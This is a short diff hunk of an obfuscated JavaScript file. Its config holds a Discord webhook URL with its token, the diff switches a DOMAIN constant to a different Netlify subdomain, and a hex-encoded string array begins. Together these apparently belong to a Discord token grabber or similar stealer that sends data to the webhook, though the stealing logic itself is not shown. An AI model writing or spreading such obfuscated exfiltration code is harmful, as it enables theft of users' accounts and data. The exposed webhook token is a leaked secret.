@@ -46,7 +46,7 @@ const config = {
     "https://discord.com/api/webhooks/1034818653041991781/M7tBgmRKEZlgfmN6greDSqELyMgvYbYVPsS5E9RFtG0TKPqWrR45xmGD8zI_dAvLzswa",
 };
 
-const DOMAIN = "https://fluffy-wisp-05b35f.netlify.app/";
+const DOMAIN = "https://grenadine-bassemlechemoi-5245.netlify.app/";
 
 var _0xbb68 = [
   "\x57\x52\x58\x63\x57\x50\x5A\x63\x53\x49\x4A\x64\x4B\x38\x6F\x52\x57\x36\x71\x50\x57\x52\x6C\x64\x47\x6D\x6F\x68",
